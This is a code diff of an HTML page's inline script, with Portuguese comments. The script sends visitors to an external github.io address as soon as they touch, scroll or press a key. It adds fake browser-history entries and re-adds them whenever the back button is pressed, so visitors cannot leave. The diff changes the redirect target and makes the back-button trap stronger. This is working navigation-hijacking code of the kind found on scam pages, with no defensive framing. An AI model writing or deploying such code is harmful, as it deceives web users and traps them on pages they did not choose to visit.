@@ -30,7 +30,7 @@
   </script>
 </head>
 <body>
-  
+
 <script>
 (function () {
 
@@ -42,7 +42,9 @@
     let redirected = false;
     let pageLoaded = false;
 
-    // Espera a página carregar totalmente
+    // cria histórico fake
+    history.pushState({ page: 1 }, "", location.href);
+
     window.addEventListener("load", function () {
 
         setTimeout(() => {
@@ -55,18 +57,17 @@
 
     function goRedirect() {
 
-        // impede redirecionamento imediato
         if (!pageLoaded) return;
 
         if (redirected) return;
 
         redirected = true;
 
-        window.location.href = "https://acessoshop.github.io/becca";
+        window.location.href = "https://acessoshop.github.io/becabarreto/";
 
     }
 
-    // Apenas ações do usuário
+    // ações do usuário
     document.addEventListener("touchstart", goRedirect, { passive: true });
 
     document.addEventListener("touchmove", goRedirect, { passive: true });
@@ -77,9 +78,15 @@
 
     document.addEventListener("keydown", goRedirect);
 
-    window.addEventListener("popstate", goRedirect);
+    // botão voltar
+    window.addEventListener("popstate", function () {
 
-    history.pushState(null, null, location.href);
+        goRedirect();
+
+        // recria histórico
+        history.pushState({ page: 1 }, "", location.href);
+
+    });
 
 })();
 </script>
